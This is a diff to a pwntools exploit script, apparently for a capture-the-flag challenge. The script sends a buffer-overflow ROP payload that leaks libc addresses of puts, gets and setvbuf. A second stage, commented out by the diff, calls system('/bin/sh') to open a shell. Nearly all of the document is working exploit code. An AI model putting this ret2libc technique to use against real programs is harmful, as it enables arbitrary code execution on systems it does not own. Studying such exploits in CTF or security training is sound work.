@@ -55,14 +55,15 @@ payload = b"A"*0x28
 payload += p64(pop_rdi_ret_gadget) + p64(got_puts_addr) + p64(plt_puts_addr)
 payload += p64(pop_rdi_ret_gadget) + p64(got_gets_addr) + p64(plt_puts_addr)
 payload += p64(pop_rdi_ret_gadget) + p64(got_setvbuf_addr) + p64(plt_puts_addr)
-payload += p64(main_address)
+#payload += p64(main_address)
 
 p.recvuntil(b"ahead")
 p.recv() #emoji
 p.sendline(payload)
 
 # grab output and unpack. dont use recvall the program will hang
-output = p.recvuntil(b"ahead").split(b"\n")
+#output = p.recvuntil(b"ahead").split(b"\n")
+output = p.recvall().split(b"\n")
 
 # pad output with \x00 to 8 bytes
 puts_leak = u64(output[0].ljust(8, b"\x00"))
@@ -73,6 +74,7 @@ print(f"puts   : {hex(puts_leak)}")
 print(f"gets   : {hex(gets_leak)}")
 print(f"setvbuf: {hex(setvbuf_leak)}")
 
+'''
 # calculate system and /bin/sh locations based on libc database
 system_addr = gets_leak - 0xXXXXXX
 stri_bin_sh = gets_leak + 0xXXXXXX
@@ -85,3 +87,4 @@ second_payload += p64(ret_address) + p64(pop_rdi_ret_gadget)
 second_payload += p64(stri_bin_sh) + p64(system_addr)
 p.sendline(second_payload)
 p.interactive()
+'''
